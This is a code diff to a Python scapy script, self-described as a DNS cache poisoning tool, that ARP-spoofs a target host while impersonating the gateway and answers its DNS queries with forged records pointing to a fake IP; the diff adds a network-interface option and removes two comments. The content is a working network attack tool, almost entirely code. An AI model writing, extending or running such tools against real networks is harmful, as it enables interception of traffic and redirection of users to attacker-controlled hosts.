@@ -8,6 +8,7 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether, getmacbyip
 import threading
 import arpspoofer
+import subprocess
 
 args_parser = argparse.ArgumentParser(prog='DNSSEC', description='DNS cache poisoning')
 
@@ -16,6 +17,7 @@ args_parser.add_argument('-s', '--src', type=str, help="The address you want for
 args_parser.add_argument('-d', '--delay', type=float, help="Delay (in seconds) between messages", default=1)
 args_parser.add_argument('-t', '--target', type=str, help="IP of target", required=True)
 args = args_parser.parse_args()
+interface = args.iface if args.iface else conf.iface
 
 GW_IP = conf.route.route("0.0.0.0")[2]
 GW_MAC = getmacbyip(GW_IP)
@@ -38,17 +40,15 @@ def forward_to_gw(pkt):
         sport=pkt[UDP].dport, dport=pkt[UDP].sport
     ) / DNS(qr=1, id=pkt[DNS].id, ancount=1, qd=DNSQR(pkt[DNS][DNSQR]),
             an=DNSRR(rrname=pkt[DNSQR].qname, rdata=FAKE_IP))
-    sendp(pkt, verbose=0)
+    sendp(pkt, verbose=0, iface=interface)
 
 
 def main():
-    # ARP spoof the DNS server pretending to be the GW
     threading.Thread(
         target=arpspoofer.main,
         args=(args.iface, TARGET_IP,
               GW_IP,
               args.delay,  # delay between messages
-              False  # we don't want to attack the GW as well
               )
     ).start()
 
